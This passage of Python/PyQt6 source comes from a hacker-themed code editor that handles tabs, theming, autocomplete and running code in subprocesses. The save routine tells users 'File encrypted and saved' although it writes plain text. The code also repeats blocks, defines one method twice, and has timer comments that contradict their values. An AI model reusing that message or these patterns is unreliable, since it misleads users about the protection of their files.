        input_layout.addWidget(self.input_line, 1)

        send_btn = QPushButton("SEND")
        send_btn.setStyleSheet("""
            QPushButton {
                background: #003300;
                color: #00ff41;
                border: 1px solid #00ff41;
                padding: 8px 20px;
                font-weight: bold;
                font-size: 12px;
                margin-left: 10px;
            }
            QPushButton:hover {
                background: #005500;
                border: 1px solid #00ff88;
            }
        """)
        send_btn.clicked.connect(self.send_input_to_process)
        input_layout.addWidget(send_btn)

        # Add the input frame below output console
        editor_layout.addWidget(self.input_frame)
        self.input_frame.hide()  # Hide by default, only show when running interactive code

    ###############################################################
    #          TAB SYSTEM METHODS (FULLY SELF-CONTAINED)          #
    ###############################################################

    def create_new_tab(self, initial_text=False):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        layout.setContentsMargins(0, 0, 0, 0)

        # Use CodeEditorWithLineNumbers instead of QTextEdit
        editor = CodeEditorWithLineNumbers()

        # === AUTOCOMPLETE EVENT FILTER (REQUIRED BY JEDI) ===
        editor.installEventFilter(self)
    
        editor.setFont(QFont("Consolas", self.current_font_size))
        editor.setStyleSheet("""
            QPlainTextEdit {
                background: transparent;
                color: #00ff41;
                selection-background-color: #003300;
                border: none;
                font-family: Consolas;
            }
        """)

        # Syntax highlighter for this tab
        highlighter = SyntaxHighlighter(editor.document(), self)

        layout.addWidget(editor)

        index = self.tabs.addTab(tab, "Untitled")
        self.tabs.setCurrentIndex(index)
        tab.editor = editor
        tab.highlighter = highlighter  # Store reference to prevent garbage collection

        if initial_text:
            editor.setPlainText("# Leviathan Editor Loaded\n")

    def current_editor(self):
        tab = self.tabs.currentWidget()
        if hasattr(tab, 'editor'):
            return tab.editor
        return None

    def close_tab(self, index):
        if self.tabs.count() == 1:
            QMessageBox.warning(self, "ERROR", "You cannot close the final tab.")
        else:
            self.tabs.removeTab(index)

    ###############################################################
    #               FILE OPERATIONS MODIFIED FOR TABS             #
    ###############################################################

    def new_file(self):
        self.create_new_tab()

    def open_file(self):
        path, _ = QFileDialog.getOpenFileName(
            self, "Open File", 
            "", "All Files (*.*);;Python (*.py);;JavaScript (*.js);;HTML (*.html);;CSS (*.css);;Bash (*.sh)"
        )
        if not path:
            return
        
        self.load_file_into_new_tab(path)

    def load_file_into_new_tab(self, path):
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                data = f.read()

            self.create_new_tab()
            ed = self.current_editor()
            if ed:
                ed.setPlainText(data)

            self.tabs.setTabText(self.tabs.currentIndex(), os.path.basename(path))
            self.status_bar.showMessage(f"Loaded {path}")
            
            # Auto-detect language
            ext = os.path.splitext(path)[1].lower()
            lang_map = {
                '.py': 'Python', '.js': 'JavaScript', '.html': 'HTML', '.css': 'CSS',
                '.sh': 'Bash', '.c': 'C', '.cpp': 'C++', '.h': 'C', '.java': 'Java',
                '.go': 'Go', '.rs': 'Rust', '.php': 'PHP', '.rb': 'Ruby', '.sql': 'SQL'
            }
            
            if ext in lang_map:
                self.lang_combo.setCurrentText(lang_map[ext])
                self.change_language(lang_map[ext])
            
        except Exception as e:
            QMessageBox.critical(self, "ERROR", f"Failed to open file:\n{str(e)}")

    def open_file_from_browser(self, path):
        self.load_file_into_new_tab(path)

    def toggle_file_browser(self):
        self.file_browser.setVisible(not self.file_browser.isVisible())

    def save_file(self):
        ed = self.current_editor()
        if not ed:
            return
            
        path, _ = QFileDialog.getSaveFileName(
            self, "Save File", 
            "", "All Files (*.*);;Python (*.py);;Text (*.txt)"
        )
        if not path:
            return

        try:
            with open(path, 'w', encoding='utf-8') as f:
                f.write(ed.toPlainText())

            self.tabs.setTabText(self.tabs.currentIndex(), os.path.basename(path))
            QMessageBox.information(self, "FILE SAVED", "File encrypted and saved.")
            self.status_bar.showMessage(f"SAVED: {os.path.basename(path)}")
            
        except Exception as e:
            QMessageBox.critical(self, "ERROR", f"Failed to save file:\n{str(e)}")
            
    def toggle_sidebar(self, visible=None):
        """Toggle sidebar visibility"""
        if visible is None:
            # Toggle based on current state
            sidebar_scroll = self.centralWidget().layout().itemAt(0).widget()
            current_visible = sidebar_scroll.isVisible()
            visible = not current_visible
    
        # Find the sidebar scroll area (it's the first widget in main layout)
        sidebar_scroll = self.centralWidget().layout().itemAt(0).widget()
        sidebar_scroll.setVisible(visible)
    
        # Update the toggle button state
        if hasattr(self, 'sidebar_toggle_action'):
            self.sidebar_toggle_action.setChecked(visible)
    
        # Update status
        if visible:
            self.status_bar.showMessage("SIDEBAR: VISIBLE")
        else:
            self.status_bar.showMessage("SIDEBAR: HIDDEN")

    # ================ BACKGROUND IMAGE METHODS - UNTOUCHED ================
    def set_background_image(self):
        """Set background image"""
        path, _ = QFileDialog.getOpenFileName(
            self, "Select Background Image",
            "", "Images (*.png *.jpg *.jpeg *.bmp *.gif *.webp)"
        )
    
        if path:
            self.background_image_path = path
        
            # Clear any old stylesheet backgrounds
            self.setStyleSheet("")
        
            # Apply using new method
            self.apply_background_style()
        
            QMessageBox.information(self, "BACKGROUND ACTIVATED", 
                              f"Background image loaded.\nMode: {self.background_mode.upper()}")
            self.status_bar.showMessage(f"BACKGROUND: {os.path.basename(path)} // MODE: {self.background_mode.upper()}")

    def clear_background_image(self):
        """Clear background image and revert to theme"""
        self.background_image_path = None
        self.background_mode = "cover"  # ADD THIS LINE - Reset to default
    
        # Clear all stylesheets first
        self.setStyleSheet("")
        self.centralWidget().setStyleSheet("")
    
        # Re-apply theme
        self.apply_theme()
    
        self.status_bar.showMessage("BACKGROUND CLEARED // THEME: " + self.current_theme)

    def load_theme(self, theme_name):
        """Load a theme"""
        self.current_theme = theme_name
        self.custom_colors = self.themes[theme_name].copy()
        self.apply_theme()

    def apply_theme(self):
        """Apply current theme - UPDATED TO PRESERVE BACKGROUND"""
        # Ensure all required keys exist in custom_colors
        required_keys = ['bg', 'panel', 'text', 'accent', 'line_bg', 'line_fg', 'select', 'cursor']
    
        # If any required key is missing, use theme defaults
        for key in required_keys:
            if key not in self.custom_colors:
                self.custom_colors[key] = self.themes[self.current_theme].get(key, "#000000")
    
        c = self.custom_colors
    
        if self.background_image_path:
            # Background image is active - only update text colors
            for i in range(self.tabs.count()):
                tab = self.tabs.widget(i)
                if hasattr(tab, 'editor'):
                    tab.editor.setStyleSheet(f"""
                        QPlainTextEdit {{
                            background: transparent;
                            color: {c.get('text', '#00ff41')};
                            selection-background-color: {c.get('select', '#003300')};
                            border: none;
                        }}
                    """)
        else:
            # No background image - apply full theme
            self.setStyleSheet(f"""
                QMainWindow {{
                    background-color: {c.get('bg', '#000000')};
                }}
            
                QWidget#centralwidget {{
                    background: {c.get('bg', '#000000')};
                }}
            """)
        
            # Also apply to all tabs
            for i in range(self.tabs.count()):
                tab = self.tabs.widget(i)
                if hasattr(tab, 'editor'):
                    tab.editor.setStyleSheet(f"""
                        QPlainTextEdit {{
                            background: transparent;
                            color: {c.get('text', '#00ff41')};
                            selection-background-color: {c.get('select', '#003300')};
                            border: none;
                        }}
                    """)
    
        # Update status bar
        if self.background_image_path:
            self.status_bar.showMessage(f"BACKGROUND: {os.path.basename(self.background_image_path)} // THEME TEXT: {self.current_theme}")
        else:
            self.status_bar.showMessage(f"THEME: {self.current_theme} // LANG: {self.current_language}")
            
    def change_language(self, lang):
        """Change programming language"""
        self.current_language = lang
        self.lexer = get_lexer_by_name(lang.lower())
        if self.background_image_path:
            self.status_bar.showMessage(f"LANG: {lang} // BACKGROUND: {os.path.basename(self.background_image_path)}")
        else:
            self.status_bar.showMessage(f"LANG: {lang} // THEME: {self.current_theme}")

    def increase_font(self):
        """Increase font size"""
        self.current_font_size = min(self.current_font_size + 2, 32)
        
        # Apply to all tabs
        for i in range(self.tabs.count()):
            tab = self.tabs.widget(i)
            if hasattr(tab, 'editor'):
                tab.editor.setFont(QFont("Consolas", self.current_font_size))
        
        self.status_bar.showMessage(f"FONT SIZE: {self.current_font_size}pt")

    def decrease_font(self):
        """Decrease font size"""
        self.current_font_size = max(self.current_font_size - 2, 8)
        
        # Apply to all tabs
        for i in range(self.tabs.count()):
            tab = self.tabs.widget(i)
            if hasattr(tab, 'editor'):
                tab.editor.setFont(QFont("Consolas", self.current_font_size))
        
        self.status_bar.showMessage(f"FONT SIZE: {self.current_font_size}pt")

    def change_transparency(self, value):
        """Change window transparency"""
        self.current_transparency = value / 100.0
        self.setWindowOpacity(self.current_transparency)
        self.status_bar.showMessage(f"TRANSPARENCY: {value}%")

    # === TOOL FUNCTIONS ===
    def open_base64_tool(self):
        """Open Base64 encoder/decoder tool"""
        dialog = Base64ToolDialog(self)
        dialog.exec()

    def open_url_tool(self):
        """Open URL encoder/decoder tool"""
        dialog = URLToolDialog(self)
        dialog.exec()

    def open_hash_tool(self):
        """Open hash identifier tool"""
        dialog = HashToolDialog(self)
        dialog.exec()

    def open_templates_tool(self):
        """Open payload templates tool"""
        dialog = TemplatesDialog(self, self.custom_templates)
        dialog.exec()
        
    # ============================================
    #  LANGUAGE → RUN COMMAND MAP
    # ============================================
    def get_run_command(self, filepath):
        """
        Build a shell command to run the given filepath, using a discovered python
        interpreter when needed. Returns None if a required interpreter is not found.
        """
        lang = self.current_language.lower()
    
        # Ensure we have a usable python interpreter when needed
        python_path = self.find_python()

        # MODIFIED: Better handling of file paths with spaces
        safe_filepath = f'"{filepath}"'
    
        commands = {
            "python": f'"{python_path}" {safe_filepath}' if python_path else None,
            "javascript": f'node {safe_filepath}',
            "bash": f'bash {safe_filepath}',
            "c": f'gcc {safe_filepath} -o "{filepath}.out" && "{filepath}.out"',
            "c++": f'g++ {safe_filepath} -o "{filepath}.out" && "{filepath}.out"',
            "go": f'go run {safe_filepath}',
            "rust": f'rustc {safe_filepath} -o "{filepath}.out" && "{filepath}.out"',
            "php": f'php {safe_filepath}',
            "ruby": f'ruby {safe_filepath}',
            "java": f'javac {safe_filepath} && java {os.path.splitext(os.path.basename(filepath))[0]}'
        }

        # Default to python if language unknown — but ensure python is available
        default = f'"{python_path}" {safe_filepath}' if python_path else None

        return commands.get(lang, default)
        
    def toggle_run_stop(self):
        """Toggle between running code and stopping execution - uses safe wrapper"""
        # Check if we're in cooldown period from either timer
        if hasattr(self, '_run_timer') and self._run_timer.isActive():
            self.status_bar.showMessage("⚠ WAIT: Still in startup cooldown...")
            return
    
        if hasattr(self, '_stop_timer') and self._stop_timer.isActive():
            self.status_bar.showMessage("⚠ WAIT: Still in stop cooldown...")
            return
    
        # Check if a process is currently running
        if hasattr(self, 'process_worker') and self.process_worker is not None:
            # Process is running, so STOP it
            self.stop_current_process()
        else:
            # No process running, use safe wrapper to prevent spam
            self.safe_run_current_file()

    # ============================================
    #  RUN CURRENT FILE + ERROR PARSING
    # ============================================
    def run_current_file(self):
        editor = self.current_editor()
        if not editor:
            return

        # Prevent crashes when running empty file
        code = editor.toPlainText()
        if code.strip() == "":
            QMessageBox.warning(self, "EMPTY FILE", "There is no code to run.")
            return

        # Clean up any existing process
        if self.process_worker:
            self.cleanup_after_process()

        import tempfile
        import os

        # --- choose temp file in system temp dir with correct extension ---
        ext_map = {
            "Python": ".py",
            "JavaScript": ".js",
            "Bash": ".sh",
            "C": ".c",
            "C++": ".cpp",
            "Java": ".java",
            "Go": ".go",
            "Rust": ".rs",
            "PHP": ".php",
            "Ruby": ".rb",
            "SQL": ".sql"
        }

        ext = ext_map.get(self.current_language, ".txt")
        # create a safe temporary file (will not be deleted automatically)
        try:
            tf = tempfile.NamedTemporaryFile(mode="w", suffix=ext, prefix="leviathan_run_", delete=False, encoding="utf-8")
            temp_path = tf.name
            tf.write(code)
            tf.flush()
            tf.close()
        except Exception as e:
            QMessageBox.critical(self, "TEMP FILE ERROR", f"Failed to create temporary file:\n{e}")
            return

        # Build run command (may be None if python not found)
        command = self.get_run_command(temp_path)
        if command is None:
            # If it's a Python run and no interpreter found, inform user
            QMessageBox.critical(
                self,
                "Interpreter Not Found",
                "Could not find a system Python interpreter (python/python3/py). "
                "Please install Python and ensure it is available on PATH."
            )
            # Clean up temp file
            try:
                os.remove(temp_path)
            except:
                pass
            return
        
        # Change button to STOP mode
        self.run_action.setText("⏹ STOP")
        
        # Show running status
        self.status_bar.showMessage("RUNNING... (Interactive Mode - Use Input Box Below)")
    
        # Show the input console
        self.input_frame.show()
        self.input_line.clear()
        self.input_line.setFocus()
    
        # Create a STOP button if not already exists
        if not self.stop_button:
            self.stop_button = QPushButton("STOP EXECUTION")
            self.stop_button.setStyleSheet("""
                QPushButton {
                    background: #ff0000;
                    color: white;
                    font-weight: bold;
                    border: 2px solid #ff4444;
                    border-radius: 4px;
                    padding: 5px;
                    margin-right: 10px;
                }
                QPushButton:hover {
                    background: #ff4444;
                }
            """)
            self.stop_button.clicked.connect(self.stop_current_process)
            self.status_bar.addPermanentWidget(self.stop_button)
    
        # Clear output console
        self.output_console.clear()
        self.output_console.appendPlainText(f"=== RUNNING {self.current_language} CODE ===\n")
        self.output_console.appendPlainText("Interactive mode active. Use the input box below to provide input.\n")
    
        # Create process worker
        self.process_worker = ProcessWorker(command, temp_path)
        
        # Start worker in a thread
        self.process_thread = QThread()
        self.process_worker.moveToThread(self.process_thread)
        
        # CRITICAL: Connect signals in the right order BEFORE starting thread
        # When worker finishes, it tells thread to quit, then cleanup happens
        self.process_worker.finished.connect(self.handle_process_finished)
        self.process_worker.finished.connect(self.process_thread.quit)  # Tell thread to stop
        self.process_thread.finished.connect(self.cleanup_thread)  # Cleanup when thread stops
        
        # Connect other signals
        self.process_worker.output_received.connect(self.handle_output)
        self.process_worker.input_prompt.connect(self.handle_input_prompt)
        self.process_worker.process_started.connect(self.handle_process_started)
        
        # Start the thread
        self.process_thread.started.connect(self.process_worker.run)
        self.process_thread.start()

    def handle_process_started(self):
        """Called when the process actually starts"""
        self.status_bar.showMessage("RUNNING... Process started successfully")

    def stop_current_process(self):
        """FIXED: Stop the currently running process without crashing"""
        # Disable button immediately to prevent spam
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(False)
            self.run_action.setText("⏳ STOPPING...")
    
        # Create a timer to re-enable button after 2 seconds (in case stop fails)
        if not hasattr(self, '_stop_timer'):
            self._stop_timer = QTimer()
        else:
            if self._stop_timer.isActive():
                self._stop_timer.stop()
    
        self._stop_timer.setSingleShot(True)
        self._stop_timer.timeout.connect(lambda: self._reenable_stop_button(force_run=True))
        self._stop_timer.start(4000)  # 1 second safety timeout
    
        if not hasattr(self, 'process_worker') or self.process_worker is None:
            self.output_console.appendPlainText("\n=== NO PROCESS RUNNING ===")
            self._reenable_stop_button(force_run=True)  # Immediately switch to RUN
            return
    
        # Check if process is actually running
        try:
            if hasattr(self.process_worker, 'process') and self.process_worker.process:
                if self.process_worker.process.poll() is not None:
                    self.output_console.appendPlainText("\n=== PROCESS ALREADY FINISHED ===")
                    self._reenable_stop_button(force_run=True)  # Immediately switch to RUN
                    self.cleanup_after_process()
                    return
        except:
            pass
    
        # Stop the process
        try:
            self.process_worker.stop()
            self.output_console.appendPlainText("\n=== PROCESS STOPPED BY USER ===")
            # Process will signal finished, which will trigger cleanup
            # The button will be re-enabled in cleanup_after_process()
        except Exception as e:
            self.output_console.appendPlainText(f"\n=== ERROR STOPPING PROCESS: {str(e)} ===")
            self._reenable_stop_button(force_run=True)  # Re-enable on error
            
    def _reenable_stop_button(self):
        """Internal method to re-enable stop button"""
        # Cancel the stop timer
        if hasattr(self, '_stop_timer') and self._stop_timer.isActive():
            self._stop_timer.stop()
    
        # Re-enable button
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(True)
            # Update text based on current state
            if hasattr(self, 'process_worker') and self.process_worker is not None:
                # Still have a process worker, show STOP
                self.run_action.setText("⏹ STOP")
            else:
                # No process worker, show RUN
                self.run_action.setText("▶ RUN")
            
    def cleanup_thread(self):
        """Clean up the thread object - called by thread.finished signal"""
        # This is called automatically when thread finishes
        # Just mark as None, don't try to stop it
        if hasattr(self, 'process_thread'):
            self.process_thread = None

            
    def cleanup_after_process(self):
        """Clean up after process finishes - prevent crashes"""
        # Cancel any pending timers
        if hasattr(self, '_run_timer') and self._run_timer.isActive():
            self._run_timer.stop()
    
        if hasattr(self, '_stop_timer') and self._stop_timer.isActive():
            self._stop_timer.stop()
    
        # IMMEDIATELY restore button to RUN state
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(True)
            self.run_action.setText("▶ RUN")
    
        # Hide input frame
        if hasattr(self, 'input_frame'):
            try:
                self.input_frame.hide()
            except:
                pass
                
        """Clean up after process finishes - prevent crashes"""
        # Cancel any pending timers
        if hasattr(self, '_run_timer') and self._run_timer.isActive():
            self._run_timer.stop()
    
        if hasattr(self, '_stop_timer') and self._stop_timer.isActive():
            self._stop_timer.stop()
    
        # Re-enable the run button with proper state
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(True)
            self.run_action.setText("▶ RUN")  # Always back to RUN after cleanup
        
        """Clean up after process finishes - prevent crashes"""
        # Cancel any pending timer
        if hasattr(self, '_run_timer') and self._run_timer.isActive():
            self._run_timer.stop()
    
        # Re-enable the run button
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(True)
            self.run_action.setText("▶ RUN")
        
        """Clean up after process finishes"""    
        # Change button back to RUN mode
        if hasattr(self, 'run_action'):
            self.run_action.setText("▶ RUN")
            
        """FIXED: Clean up after process finishes - prevent crashes"""
        # Hide input frame
        if hasattr(self, 'input_frame'):
            try:
                self.input_frame.hide()
            except:
                pass
        
        # Remove and delete stop button safely
        if hasattr(self, 'stop_button') and self.stop_button is not None:
            try:
                self.status_bar.removeWidget(self.stop_button)
            except:
                pass
            
            try:
                self.stop_button.deleteLater()
            except:
                pass
            
            self.stop_button = None
        
        # DON'T manually stop thread here - it should already be finishing
        # Just mark it for deletion
        if hasattr(self, 'process_thread') and self.process_thread is not None:
            try:
                # Don't call quit() or wait() - thread should be stopping naturally
                # Just schedule for deletion when it's actually done
                self.process_thread.deleteLater()
            except:
                pass
            
            self.process_thread = None
        
        # Reset worker
        if hasattr(self, 'process_worker'):
            self.process_worker = None
        
        # Update status
        try:
            self.status_bar.showMessage("READY")
        except:
            pass

    def handle_output(self, text, is_error):
        if text.strip():  # Only append non-empty lines
            if is_error:
                self.output_console.appendPlainText(f"ERROR: {text.rstrip()}")
            else:
                self.output_console.appendPlainText(text.rstrip())

    def handle_input_prompt(self, prompt):
        """FIXED: Handle input prompts - show ALL prompts immediately"""
        # Always show the prompt in output console
        if prompt and prompt.strip():
            # Don't duplicate if it's already the last line
            current_text = self.output_console.toPlainText()
            last_line = current_text.split('\n')[-1].strip()
            
            if last_line != prompt.strip():
                # Only add if it's new
                pass  # Already emitted by read_stdout
        
        # Make input box visible and ready
        if hasattr(self, 'input_frame'):
            self.input_frame.show()
        
        if hasattr(self, 'input_line'):
            # Set placeholder
            clean_prompt = prompt.strip()
            if len(clean_prompt) > 40:
                clean_prompt = clean_prompt[:37] + "..."
            
            self.input_line.setPlaceholderText(f"→ {clean_prompt}")
            self.input_line.setFocus()
            
            # Update status bar
            self.status_bar.showMessage(f"⚠ INPUT REQUIRED: {prompt[:60]}")
            
    def handle_process_finished(self):
        """Called when the process finishes naturally OR is stopped"""
        # Cancel all timers
        if hasattr(self, '_run_timer') and self._run_timer.isActive():
            self._run_timer.stop()
    
        if hasattr(self, '_stop_timer') and self._stop_timer.isActive():
            self._stop_timer.stop()
    
        self.output_console.appendPlainText("\n=== EXECUTION COMPLETE ===")
        self.status_bar.showMessage("EXECUTION COMPLETE")
    
        # IMMEDIATELY update button state
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(True)
            self.run_action.setText("▶ RUN")
    
        # Clean up immediately when process signals it's done
        self.cleanup_after_process()
    
    def finalize_process(self):
        """Final cleanup after process finishes"""
        self.output_console.appendPlainText("\n=== EXECUTION COMPLETE ===")
        self.status_bar.showMessage("EXECUTION COMPLETE")
        
        # Clean up
        self.cleanup_after_process()
    
    def highlight_error_line(self, error_text):
        if not error_text:
            return

        editor = self.current_editor()
        if not editor:
            return

        # Common error formats like:
        #   File "x.py", line 23
        match = re.search(r'line (\d+)', error_text)
        if not match:
            return

        line_num = int(match.group(1)) - 1  # zero-based

        cursor = editor.textCursor()
        cursor.movePosition(QTextCursor.MoveOperation.Start)
        cursor.movePosition(QTextCursor.MoveOperation.Down, n=line_num)
        editor.setTextCursor(cursor)

        # Flash highlight (temporary)
        extra = QTextEdit.ExtraSelection()
        extra.format.setBackground(QColor("#440000"))
        extra.cursor = cursor
        editor.setExtraSelections([extra])
        
    def safe_run_current_file(self):
        """Thread-safe wrapper for run_current_file - prevents button spam"""
        # Check if already in startup cooldown
        if hasattr(self, '_run_timer') and self._run_timer.isActive():
            # Button was clicked too soon
            self.status_bar.showMessage("⚠ WAIT: Previous execution still starting...")
            return
    
        # Also check if we're in stop cooldown
        if hasattr(self, '_stop_timer') and self._stop_timer.isActive():
            # Still stopping previous process
            self.status_bar.showMessage("⚠ WAIT: Still stopping previous process...")
            return
    
        # Check if process is already running (extra safety)
        if hasattr(self, 'process_worker') and self.process_worker is not None:
            # Actually should show STOP, not RUN - user should click stop first
            if hasattr(self, 'run_action'):
                self.run_action.setText("⏹ STOP")
                self.run_action.setEnabled(True)  # Make sure it's enabled
            self.status_bar.showMessage("⚠ Process already running - click STOP first")
            return
    
        # Disable the button immediately
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(False)
            self.run_action.setText("⏳ STARTING...")
    
        # Create a timer to prevent rapid clicking
        self._run_timer = QTimer()
        self._run_timer.setSingleShot(True)
        self._run_timer.timeout.connect(self._reenable_run_button)  # Re-enable after timeout
        self._run_timer.start(1000)  # 2 second timeout - enough time to start process
    
        # Actually run the file
        self.run_current_file()

    def _reenable_run_button(self):
        """Internal method to re-enable run button after timeout"""
        # Only re-enable if we have the button
        if hasattr(self, 'run_action'):
            # Check if process actually started successfully
            time.sleep(0.1)  # Small delay to let state settle
        
            # Enable button first
            self.run_action.setEnabled(True)
        
            # Then set correct text based on actual state
            if hasattr(self, 'process_worker') and self.process_worker is not None:
                try:
                    # Check if process is still alive
                    if (hasattr(self.process_worker.process, 'poll') and 
                        self.process_worker.process.poll() is None):
                        # Process is running, show STOP
                        self.run_action.setText("⏹ STOP")
                        self.status_bar.showMessage("Process running - Click STOP to stop")
                    else:
                        # Process died, show RUN
                        self.run_action.setText("▶ RUN")
                        self.status_bar.showMessage("Process finished - Click RUN to start")
                except:
                    # On error, default to RUN
                    self.run_action.setText("▶ RUN")
                    self.status_bar.showMessage("READY - Click RUN to start")
            else:
                # No process, show RUN
                self.run_action.setText("▶ RUN")
                self.status_bar.showMessage("READY - Click RUN to start")

    def _reenable_stop_button(self, force_run=False):
        """Internal method to re-enable stop button"""
        # Cancel the stop timer
        if hasattr(self, '_stop_timer') and self._stop_timer.isActive():
            self._stop_timer.stop()
    
        # Re-enable button
        if hasattr(self, 'run_action'):
            self.run_action.setEnabled(True)
        
            # If force_run is True OR no process is running, show RUN
            if force_run or not hasattr(self, 'process_worker') or self.process_worker is None:
                self.run_action.setText("▶ RUN")
                self.status_bar.showMessage("READY - Click RUN to start")
            else:
                # Process still exists somehow, show STOP
                self.run_action.setText("⏹ STOP")
                self.status_bar.showMessage("Process still running - Click STOP to stop")
        
    def show_autocomplete(self):
        editor = self.current_editor()
        if not editor:
            return

        # Get text and cursor position
        text = editor.toPlainText()
        cursor = editor.textCursor()
        line = cursor.blockNumber() + 1
        column = cursor.columnNumber()

        try:
            script = jedi.Script(code=text)
            completions = script.complete(line, column)
        except Exception:
            self.autocomplete_popup.hide()
            return

        if not completions:
            self.autocomplete_popup.hide()
            return

        # Fill popup
        self.autocomplete_popup.clear()
        for c in completions:
            item = QListWidgetItem(c.name)
            self.autocomplete_popup.addItem(item)

        # Position popup below cursor
        cursor_rect = editor.cursorRect()
        pos = editor.mapToGlobal(cursor_rect.bottomRight())

        self.autocomplete_popup.move(pos + QPoint(10, 10))
        self.autocomplete_popup.setCurrentRow(0)
        self.autocomplete_popup.show()
        
    def apply_completion(self):
        editor = self.current_editor()
        if not editor:
            return

        item = self.autocomplete_popup.currentItem()
        if not item:
            self.autocomplete_popup.hide()
            return

        text = item.text()

        cursor = editor.textCursor()

        # Delete the partial word before inserting
        cursor.select(cursor.SelectionType.WordUnderCursor)
        cursor.removeSelectedText()

        cursor.insertText(text)
        editor.setTextCursor(cursor)

        self.autocomplete_popup.hide()
        
    # ===========================================
    # EVENT FILTER FOR AUTOCOMPLETE
    # ===========================================
    def eventFilter(self, obj, event):
        # Key presses inside editor
        if event.type() == event.Type.KeyPress:
            key = event.key()

            # Hide popup on Escape
            if key == Qt.Key.Key_Escape:
                self.autocomplete_popup.hide()
                return False

            # Accept completion with Enter/Return/Tab
            if self.autocomplete_popup.isVisible():
                if key in (Qt.Key.Key_Return, Qt.Key.Key_Enter, Qt.Key.Key_Tab):
                    self.apply_completion()
                    return True

                # Move in list
                if key == Qt.Key.Key_Up:
                    current = self.autocomplete_popup.currentRow()
                    self.autocomplete_popup.setCurrentRow(max(0, current - 1))
                    return True

                if key == Qt.Key.Key_Down:
                    current = self.autocomplete_popup.currentRow()
                    self.autocomplete_popup.setCurrentRow(
                        min(self.autocomplete_popup.count() - 1, current + 1)
                    )
                    return True

            # Trigger suggestions on:
            # letters, numbers, underscore, dot
            if key == Qt.Key.Key_Period or key == Qt.Key.Key_Underscore:
                QTimer.singleShot(0, self.show_autocomplete)
            elif 32 <= key < 127:  # Printable ASCII range
                try:
                    if chr(key).isalnum():
                        QTimer.singleShot(0, self.show_autocomplete)
                except ValueError:
                    pass
            else:
                # Hide popup when typing unrelated keys
                self.autocomplete_popup.hide()

        return super().eventFilter(obj, event)

    def change_background_mode(self, mode):
        """Change background image display mode"""
        self.background_mode = mode.lower()
    
        print(f"DEBUG: Mode changed to {self.background_mode}")  # ADD THIS DEBUG LINE
    
        # Re-apply background if one is set
        if self.background_image_path:
            print(f"DEBUG: Applying background style...")  # ADD THIS DEBUG LINE
            self.apply_background_style()
        else:
            print(f"DEBUG: No background image set")  # ADD THIS DEBUG LINE

    def apply_background_style(self):
        """Apply background image with current mode using QPalette"""
        if not self.background_image_path:
            return
    
        print(f"DEBUG: Applying mode '{self.background_mode}' to image")
    
        # Load the original image
        from PyQt6.QtGui import QBrush  # Make sure this is imported at top of file
    
        pixmap = QPixmap(self.background_image_path)
        if pixmap.isNull():
            print("DEBUG: Failed to load image")
            return
    
        # Get the window size
        window_size = self.size()
    
        # Scale the pixmap based on mode
        if self.background_mode == "cover":
            # Scale to cover entire window, crop if needed
            scaled = pixmap.scaled(
                window_size, 
                Qt.AspectRatioMode.KeepAspectRatioByExpanding,
                Qt.TransformationMode.SmoothTransformation
            )
        elif self.background_mode == "contain":
            # Scale to fit inside window, may have borders
            scaled = pixmap.scaled(
                window_size,
                Qt.AspectRatioMode.KeepAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
        elif self.background_mode == "stretch":
            # Stretch to fill window (ignores aspect ratio)
            scaled = pixmap.scaled(
                window_size,
                Qt.AspectRatioMode.IgnoreAspectRatio,
                Qt.TransformationMode.SmoothTransformation
            )
        elif self.background_mode == "center":
            # Use original size, centered
            scaled = pixmap
        elif self.background_mode == "tile":
            # For tile, we'll use original size and tile it
            scaled = pixmap
        else:
            scaled = pixmap.scaled(
                window_size,
                Qt.AspectRatioMode.KeepAspectRatioByExpanding,
                Qt.TransformationMode.SmoothTransformation
            )
    
        # Create a brush from the pixmap - THIS IS THE FIX
        brush = QBrush(scaled)
    
        # Apply the background using QPalette
        palette = self.palette()
        palette.setBrush(QPalette.ColorRole.Window, brush)  # Use brush, not pixmap
        self.setPalette(palette)
    
        # Set autoFillBackground to True so palette is used
        self.setAutoFillBackground(True)
    
        # Make sure widgets stay transparent
        self.centralWidget().setStyleSheet("background: transparent;")
    
        # Apply to all tab editors
        for i in range(self.tabs.count()):
            tab = self.tabs.widget(i)
            if hasattr(tab, 'editor'):
                tab.editor.setStyleSheet("background: transparent; color: #00ff41;")
    
        print(f"DEBUG: Background applied with mode '{self.background_mode}'!")
        self.status_bar.showMessage(f"BACKGROUND MODE: {self.background_mode.upper()}")
        
    def open_customization_window(self):
        """Open the full customization dialog"""
        if not hasattr(self, 'customization_dialog') or not self.customization_dialog:
            self.customization_dialog = CustomizationDialog(self)
    
        # Load current colors into dialog
        self.load_current_colors_into_dialog()
    
        self.customization_dialog.show()
        self.customization_dialog.raise_()
        self.customization_dialog.activateWindow()

    def load_current_colors_into_dialog(self):
        """Load current colors into customization dialog - FIXED"""
        if not hasattr(self, 'customization_dialog') or not self.customization_dialog:
            return
    
        # Check if dialog has color_widgets attribute
        if not hasattr(self.customization_dialog, 'color_widgets'):
            return
    
        # Load all current colors into the dialog inputs
        for color_key, widgets in self.customization_dialog.color_widgets.items():
            if color_key in self.custom_colors:
                current_color = self.custom_colors[color_key]
                widgets['input'].setText(current_color)
            
                # Update preview
                if QColor.isValidColor(current_color):
                    widgets['preview'].setStyleSheet(f"background: {current_color}; border: 1px solid #ffffff;")

    def preview_custom_colors(self, colors):
        """Preview custom colors without saving"""
        # Apply colors temporarily
        self.apply_custom_colors(colors, preview=True)

    def apply_custom_colors(self, colors, preview=False):
        """Apply custom colors to the UI - FIXED VERSION"""
        # Store colors
        self.custom_colors.update(colors)  # Update instead of replace
    
        c = self.custom_colors  # Shorter alias
    
        # === SIDEBAR BACKGROUND ===
        sidebar = self.findChild(QFrame)  # Find the main sidebar frame
        if sidebar:
            sidebar.setStyleSheet(f"""
                QFrame {{
                    background-color: {c.get('sidebar_bg', '#111122')};
                    border-right: 2px solid {c.get('accent', '#00ff41')};
                }}
            """)
    
        # === SIDEBAR TITLES ===
        for label in self.findChildren(QLabel):
            if "LEVIATHAN\nEDIT v3.0" in label.text():
